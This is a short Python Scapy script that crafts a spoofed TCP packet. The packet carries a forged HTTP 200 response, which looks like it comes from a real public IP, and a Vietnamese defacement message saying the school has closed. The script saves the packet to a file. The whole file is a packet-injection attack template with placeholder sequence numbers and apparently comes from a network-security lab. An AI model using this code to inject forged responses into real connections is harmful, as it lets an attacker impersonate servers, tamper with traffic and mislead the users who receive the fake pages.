from scapy.all import *

ip = IP(src = '112.137.129.187', dst = '192.168.0.10', chksum = 0)
html_body = '<html><h1> truong chung toi da dong cua! </h1></html>'
tcp_payload  = "HTTP/1.1 200 OK\r\n"
tcp_payload += "Server: nginx\r\n"
tcp_payload += "Content-Length: %d\r\n" % len(html_body)
tcp_payload += "\r\n"
tcp_payload += html_body
# new sequence number
new_seq = 12345
# new ack number 
new_ack = 54321
#Swap src port, dstport and update sequence number
tcp = TCP(sport = 80, dport = 12345, seq = new_seq, ack=new_ack, flags='AP', chksum = 0)
spoof_respond = ip/tcp/tcp_payload

with open('http.bin', 'wb') as f:
	f.write(bytes(spoof_respond))
